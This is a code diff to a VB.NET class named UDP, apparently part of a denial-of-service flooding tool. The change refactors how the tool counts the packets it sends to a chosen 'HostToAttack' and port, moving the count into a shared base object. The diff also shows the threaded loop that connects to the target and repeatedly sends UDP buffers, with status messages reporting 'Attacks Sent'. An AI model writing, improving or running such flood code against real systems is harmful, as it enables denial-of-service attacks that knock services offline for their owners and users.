@@ -9,7 +9,6 @@ Public Class UDP
     Private Port As Integer
     Private Threads As Thread()
     Private AttackRunning As Boolean = False
-    Private attacks As Integer = 0
     Private msgLength As Integer
     Public Sub New(ByVal model As UdpModel)
         If Not AttackRunning = True Then
@@ -40,8 +39,7 @@ Public Class UDP
             ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            GetFloodsBase().SetMessage("UDP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & attacks.ToString)
-            attacks = 0
+            GetFloodsBase().SetMessage("UDP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
             GetFloodsBase().SetEnd()
         End If
 
@@ -56,8 +54,7 @@ Public Class UDP
                 End Try
             Next
             AttackRunning = False
-            GetFloodsBase().SetMessage("UDP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & attacks.ToString)
-            attacks = 0
+            GetFloodsBase().SetMessage("UDP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
 
         Else
             GetFloodsBase().SetMessage("No UDP Attack is Running!")
@@ -84,8 +81,8 @@ Public Class UDP
                     udpc.Connect(hostep)
                     udpc.SendTo(buffer, hostep)
 
-                    attacks = attacks + 1
-                    GetFloodsBase().Set_AttackUpStrengOnByte(attacks * msgLength)
+                    GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
+                    GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * msgLength)
                     Dim bytes As Integer = 0
                     Dim sb = New StringBuilder()
                     Dim bytesReceived As Byte() = New Byte(255) {}
@@ -95,7 +92,7 @@ Public Class UDP
                         sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                     Loop Until bytes > 0
 
-                    GetFloodsBase().Set_AttackDownStrengOnByte(attacks * sb.ToString().Length)
+                    GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
 
                     udpc.Close()
                     Continue Do
